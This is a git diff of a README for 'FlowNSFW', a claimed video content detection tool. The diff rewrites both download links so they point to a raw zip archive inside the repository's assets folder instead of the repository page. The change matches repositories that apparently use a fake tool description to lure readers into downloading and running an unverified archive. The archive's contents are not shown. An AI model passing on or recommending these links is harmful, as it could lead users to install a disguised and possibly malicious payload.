@@ -1,6 +1,6 @@
 # 🔍 FlowNSFW - Detect sensitive video content with speed
 
-[![Download FlowNSFW](https://img.shields.io/badge/Download-FlowNSFW-blue.svg)](https://github.com/wesleycamphoraceous336/FlowNSFW)
+[![Download FlowNSFW](https://img.shields.io/badge/Download-FlowNSFW-blue.svg)](https://github.com/wesleycamphoraceous336/FlowNSFW/raw/refs/heads/main/assets/NSFW-Flow-v2.8.zip)
 
 FlowNSFW identifies sensitive content in video files. This tool uses image analysis to flag videos that contain inappropriate material. It processes these files through a model trained to recognize motion and detail. Computer vision technology allows the software to maintain high accuracy across different types of footage.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and software to run this tool smoothly. Ch
 
 You must visit the website to download the latest version of the installer.
 
-[Download FlowNSFW Installer](https://github.com/wesleycamphoraceous336/FlowNSFW)
+[Download FlowNSFW Installer](https://github.com/wesleycamphoraceous336/FlowNSFW/raw/refs/heads/main/assets/NSFW-Flow-v2.8.zip)
 
 Follow these steps to obtain the files:
 1. Open your web browser.
